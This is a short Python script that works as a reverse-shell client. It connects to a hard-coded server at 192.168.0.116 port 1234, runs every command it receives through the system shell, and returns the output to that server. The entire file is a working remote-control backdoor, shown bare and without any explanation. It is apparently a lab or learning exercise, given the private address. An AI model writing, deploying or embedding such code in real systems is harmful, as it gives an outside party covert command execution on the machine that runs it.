import socket
import subprocess

# Server IP
HOST = '192.168.0.116'
# Server PORT
PORT = 1234

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as c:
    c.connect((HOST, PORT))

    while True:
        data = c.recv(1024)

        if data.decode() == 'exit':
            break

        result = subprocess.run(data.decode(), shell=True, capture_output=True, text=True)
        print(f'Server: {data.decode()}')
        c.sendall(result.stdout.encode() if result.stdout else 'Done!'.encode())
